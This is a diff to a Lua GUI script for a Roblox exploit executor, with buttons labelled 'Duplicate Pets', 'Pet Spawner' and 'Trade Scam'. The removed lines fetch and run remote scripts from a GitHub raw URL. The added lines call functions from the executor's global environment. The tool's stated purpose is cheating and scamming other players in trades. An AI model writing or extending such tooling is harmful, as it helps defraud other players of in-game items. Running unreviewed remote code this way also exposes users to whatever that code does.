@@ -11,7 +11,7 @@ frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
 frame.Active = true
 Instance.new("UICorner", frame)
 
--- Manual drag support (Delta-compatible)
+-- Dragging support
 local UIS = game:GetService("UserInputService")
 local dragging, dragInput, dragStart, startPos
 
@@ -47,7 +47,7 @@ UIS.InputChanged:Connect(function(input)
 	end
 end)
 
--- Popup message display
+-- Message popup
 local function showMessage(text)
 	local popup = Instance.new("TextLabel", gui)
 	popup.Size = UDim2.new(0, 300, 0, 30)
@@ -63,7 +63,7 @@ local function showMessage(text)
 	end)
 end
 
--- Button creation
+-- Button builder
 local function createButton(label, yPos, callback)
 	local btn = Instance.new("TextButton", frame)
 	btn.Size = UDim2.new(0, 300, 0, 40)
@@ -87,36 +87,20 @@ local function createButton(label, yPos, callback)
 	end)
 end
 
--- Button actions using loadfile()
-
+-- Button logic via getgenv()
 local function runDuplicatePets()
-	local func = loadfile("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/main/source.lua")
-	if func then
-		func()
-	else
-		warn("❌ Failed to load Duplicate Pets script")
-	end
+	getgenv().RunDuplicatePets()
 end
 
 local function runPetSpawner()
-	local func = loadfile("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/pet_spawner.lua")
-	if func then
-		func()
-	else
-		warn("❌ Failed to load Pet Spawner script")
-	end
+	getgenv().RunPetSpawner()
 end
 
 local function runTradeScam()
-	local func = loadfile("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/trade_scam.lua")
-	if func then
-		func()
-	else
-		warn("❌ Failed to load Trade Scam script")
-	end
+	getgenv().RunTradeScam()
 end
 
--- Create GUI buttons
+-- Create buttons
 createButton("🐾 Duplicate Pets", 20, runDuplicatePets)
 createButton("🐶 Pet Spawner", 80, runPetSpawner)
 createButton("💰 Trade Scam", 140, runTradeScam)
